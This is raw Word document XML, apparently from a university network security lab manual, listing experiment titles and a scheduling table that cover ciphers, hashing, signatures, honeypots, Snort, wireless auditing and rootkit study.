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B2" w:rsidRPr="006E2AF8" w:rsidRDefault="00FB37B2" w:rsidP="00FB37B2">
      <w:pPr>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="0" w:name="_GoBack"/>
      <w:bookmarkEnd w:id="0"/>
    </w:p>
    <w:p w:rsidR="004259B2" w:rsidRDefault="004259B2" w:rsidP="004259B2">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>List Of Experiments</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004259B2" w:rsidRDefault="004259B2"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 xml:space="preserve">Implement the following SUBSTITUTION &amp; TRANSPOSITION TECHNIQUES concepts: </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Caesar Cipher</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Playfair Cipher</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Hill Cipher</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Vigenere Cipher</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Rail fence – row &amp; Column Transformation</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 xml:space="preserve">Implement the following algorithms </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DES</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RSA Algorithm</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Diffiee-Hellman</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MD5</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00516E79" w:rsidRPr="00516E79" w:rsidRDefault="00516E79" w:rsidP="00516E79">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>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SHA-1</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Implement the SIGNATURE SCHEME – Digital Signature Standard</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Demonstrate how to provide secure data storage, secure data transmission and for creating digital signatures (GnuPG).</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Setup a honey pot and monitor the honeypot on network (KF Sensor)</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Installation of rootkits and study about the variety of options</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Perform wireless audit on an access point or a router and decrypt WEP and WPA.( Net Stumbler)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00516E79" w:rsidRPr="00516E79" w:rsidRDefault="00516E79" w:rsidP="00516E79">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:lang w:val="en"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00516E79">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:lang w:val="en"/>
        </w:rPr>
        <w:t>Demonstrate intrusion detection system (ids) using any tool (snort or any other s/w)</w:t>
      </w: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4259B2">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00516E79" w:rsidRDefault="00516E79" w:rsidP="00337CBC">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00337CBC" w:rsidRDefault="00337CBC" w:rsidP="00337CBC">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="008B0F50" w:rsidRDefault="008B0F50" w:rsidP="00337CBC">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="008B0F50" w:rsidRDefault="008B0F50" w:rsidP="00337CBC">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="008B0F50" w:rsidRDefault="008B0F50" w:rsidP="00337CBC">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00337CBC" w:rsidRDefault="00337CBC" w:rsidP="00337CBC">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>LAB PLAN</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00337CBC" w:rsidRDefault="00337CBC" w:rsidP="00337CBC">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>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150"/>
        <w:gridCol w:w="4194"/>
        <w:gridCol w:w="1963"/>
        <w:gridCol w:w="1356"/>
      </w:tblGrid>
      <w:tr w:rsidR="00337CBC" w:rsidTr="00281202">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="974" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00337CBC" w:rsidRPr="00337CBC" w:rsidRDefault="00337CBC" w:rsidP="00027F37">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00337CBC">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Sl.No</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1150" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00337CBC" w:rsidRPr="00337CBC" w:rsidRDefault="00337CBC" w:rsidP="00027F37">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00337CBC">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
              </w:rPr>
              <w:t>Date</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4194" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00337CBC" w:rsidRPr="00337CBC" w:rsidRDefault="00337CBC" w:rsidP="00027F37">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00337CBC">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
              </w:rPr>
              <w:t>Name of the Experiment</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1963" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00337CBC" w:rsidRPr="00337CBC" w:rsidRDefault="00337CBC" w:rsidP="00027F37">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00337CBC">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
              </w:rPr>
              <w:t>Batch-1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1356" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00337CBC" w:rsidRPr="00337CBC" w:rsidRDefault="00337CBC" w:rsidP="00027F37">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00337CBC">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
              </w:rPr>
              <w:t>Batch-2</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00337CBC" w:rsidTr="00281202">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="974" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00337CBC" w:rsidRPr="00337CBC" w:rsidRDefault="00337CBC" w:rsidP="004C26F7">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00337CBC">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1150" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00337CBC" w:rsidRPr="00337CBC" w:rsidRDefault="00337CBC" w:rsidP="00027F37">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4194" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00337CBC" w:rsidRPr="004C26F7" w:rsidRDefault="004C26F7" w:rsidP="00281202">
            <w:pPr>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:suppressAutoHyphens w:val="0"/>
              <w:spacing w:after="94"/>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="333333"/>
                <w:lang w:eastAsia="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004C26F7">
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="333333"/>
                <w:lang w:eastAsia="en-IN"/>
              </w:rPr>
              <w:t>CAESAR CIPHER</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1963" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00337CBC" w:rsidRPr="00337CBC" w:rsidRDefault="00337CBC" w:rsidP="00027F37">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1356" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00337CBC" w:rsidRPr="00337CBC" w:rsidRDefault="00337CBC"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2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1150" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00281202" w:rsidRPr="00337CBC" w:rsidRDefault="00281202" w:rsidP="00027F37">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4194" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00281202" w:rsidRPr="004C26F7" w:rsidRDefault="004C26F7" w:rsidP="00281202">
            <w:pPr>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:suppressAutoHyphens w:val="0"/>
              <w:spacing w:after="94"/>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="333333"/>
                <w:lang w:eastAsia="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004C26F7">
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="333333"/>
                <w:lang w:eastAsia="en-IN"/>
              </w:rPr>
              <w:t>VIGENERE CIPHER</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3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1150" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00281202" w:rsidRPr="00337CBC" w:rsidRDefault="00281202" w:rsidP="00027F37">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4194" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00281202" w:rsidRPr="004C26F7" w:rsidRDefault="004C26F7" w:rsidP="00281202">
            <w:pPr>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:suppressAutoHyphens w:val="0"/>
              <w:spacing w:after="94"/>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="333333"/>
                <w:lang w:eastAsia="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004C26F7">
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="333333"/>
                <w:lang w:eastAsia="en-IN"/>
              </w:rPr>
              <w:t>HILL CIPHER</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4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1150" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00281202" w:rsidRPr="00337CBC" w:rsidRDefault="00281202" w:rsidP="00027F37">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4194" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00281202" w:rsidRPr="004C26F7" w:rsidRDefault="004C26F7" w:rsidP="00281202">
            <w:pPr>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:suppressAutoHyphens w:val="0"/>
              <w:spacing w:after="94"/>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="333333"/>
                <w:lang w:eastAsia="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004C26F7">
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="333333"/>
                <w:lang w:eastAsia="en-IN"/>
              </w:rPr>
              <w:t>PLAYFAIR CIPHER</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5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1150" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00281202" w:rsidRPr="00337CBC" w:rsidRDefault="00281202" w:rsidP="00027F37">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4194" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00281202" w:rsidRPr="004C26F7" w:rsidRDefault="004C26F7" w:rsidP="00D90103">
            <w:pPr>
              <w:tabs>
                <w:tab w:val="left" w:pos="935"/>
              </w:tabs>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004C26F7">
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="333333"/>
              </w:rPr>
              <w:t>RAIL FENCE – ROW &amp; COLUMN TRANSFORMATION</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6</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1150" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00281202" w:rsidRPr="00337CBC" w:rsidRDefault="00281202" w:rsidP="00027F37">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4194" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00281202" w:rsidRPr="004C26F7" w:rsidRDefault="004C26F7" w:rsidP="00027F37">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004C26F7">
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="333333"/>
              </w:rPr>
              <w:t>DES</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7</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1150" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00281202" w:rsidRPr="00337CBC" w:rsidRDefault="00281202" w:rsidP="00027F37">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4194" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00281202" w:rsidRPr="004C26F7" w:rsidRDefault="004C26F7" w:rsidP="00BC60D9">
            <w:pPr>
              <w:spacing w:line="360" w:lineRule="auto"/>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="FF0000"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004C26F7">
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="333333"/>
              </w:rPr>
              <w:t>RSA ALGORITHM</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8</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1150" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00281202" w:rsidRPr="00337CBC" w:rsidRDefault="00281202" w:rsidP="00027F37">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4194" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00281202" w:rsidRPr="004C26F7" w:rsidRDefault="004C26F7" w:rsidP="00027F37">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004C26F7">
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="333333"/>
              </w:rPr>
              <w:t>DIFFIEE-HELLMAN</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9</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1150" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00281202" w:rsidRPr="00337CBC" w:rsidRDefault="00281202" w:rsidP="00027F37">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4194" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00281202" w:rsidRPr="004C26F7" w:rsidRDefault="004C26F7" w:rsidP="00027F37">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004C26F7">
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
              </w:rPr>
              <w:t>MD5</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10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1150" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00281202" w:rsidRPr="00337CBC" w:rsidRDefault="00281202" w:rsidP="00027F37">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4194" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00281202" w:rsidRPr="004C26F7" w:rsidRDefault="004C26F7" w:rsidP="00337CBC">
            <w:pPr>
              <w:spacing w:line="360" w:lineRule="auto"/>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004C26F7">
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
              </w:rPr>
              <w:t>SHA-1</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11</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1150" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00281202" w:rsidRPr="00337CBC" w:rsidRDefault="00281202" w:rsidP="00027F37">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4194" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00281202" w:rsidRPr="004C26F7" w:rsidRDefault="004C26F7" w:rsidP="00337CBC">
            <w:pPr>
              <w:spacing w:line="360" w:lineRule="auto"/>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004C26F7">
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
              </w:rPr>
              <w:t>DIGITAL SIGNATURE STANDARD(DSA)</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281202" w:rsidTr="00281202">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="974" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00281202" w:rsidRPr="00337CBC" w:rsidRDefault="00281202" w:rsidP="004C26F7">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00337CBC">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
              </w:rPr>
              <w:t>12</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1150" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00281202" w:rsidRPr="00337CBC" w:rsidRDefault="00281202" w:rsidP="00027F37">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4194" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00281202" w:rsidRPr="004C26F7" w:rsidRDefault="004C26F7" w:rsidP="004C26F7">
            <w:pPr>
              <w:spacing w:line="360" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004C26F7">
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="333333"/>
              </w:rPr>
              <w:t>TO PROVIDE SECURE DATA STORAGE, SECURE DATA TRANSMISSION AND FOR CREATING DIGITAL SIGNATURES (GNUPG).</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1963" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00281202" w:rsidRPr="00337CBC" w:rsidRDefault="00281202" w:rsidP="00027F37">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1356" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00281202" w:rsidRPr="00337CBC" w:rsidRDefault="00281202" w:rsidP="00027F37">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004C26F7" w:rsidTr="00281202">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="974" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="004C26F7" w:rsidRPr="004C26F7" w:rsidRDefault="004C26F7" w:rsidP="004C26F7">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004C26F7">
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>13(A)</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STUDY OF HONEY POTS</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1963" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="004C26F7" w:rsidRPr="00337CBC" w:rsidRDefault="004C26F7" w:rsidP="00027F37">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>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13(B)</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HONEY POTS</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1963" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="004C26F7" w:rsidRPr="00337CBC" w:rsidRDefault="004C26F7" w:rsidP="00027F37">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>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14(A)</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STUDY OF KALI LINUX DISTRIBUTION</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1963" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="004C26F7" w:rsidRPr="00337CBC" w:rsidRDefault="004C26F7" w:rsidP="00027F37">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>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14(B)</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WIRELESS AUDIT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1963" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="004C26F7" w:rsidRPr="00337CBC" w:rsidRDefault="004C26F7" w:rsidP="00027F37">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>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15</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SNORT IDS</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1963" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="004C26F7" w:rsidRDefault="004C26F7" w:rsidP="004C26F7"/>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16(A)</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 xml:space="preserve">STUDY OF ROOT KITS </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1963" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="004C26F7" w:rsidRDefault="004C26F7" w:rsidP="004C26F7"/>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sidRPr="004C26F7">
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>16(B)</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rPr>
              <w:t>ROOT KIT INSTALLATION</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1963" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="004C26F7" w:rsidRDefault="004C26F7" w:rsidP="004C26F7"/>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Pr>
                <w:b/>
              </w:rPr>
              <w:t>17(A)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1150" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="004C26F7" w:rsidRDefault="004C26F7" w:rsidP="004C26F7"/>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4194" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="004C26F7" w:rsidRPr="004C26F7" w:rsidRDefault="004C26F7" w:rsidP="004C26F7">
            <w:pPr>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:suppressAutoHyphens w:val="0"/>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Arial"/>
                <w:color w:val="222222"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004C26F7">
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Arial"/>
                <w:color w:val="222222"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>STUDY OF SECURITY TOOLS</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1963" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="004C26F7" w:rsidRDefault="004C26F7" w:rsidP="004C26F7"/>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jc w:val="center"/>
              <w:rPr>
                <w:b/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>17(B)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1150" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="004C26F7" w:rsidRDefault="004C26F7" w:rsidP="004C26F7"/>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4194" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="004C26F7" w:rsidRPr="004C26F7" w:rsidRDefault="004C26F7" w:rsidP="004C26F7">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004C26F7">
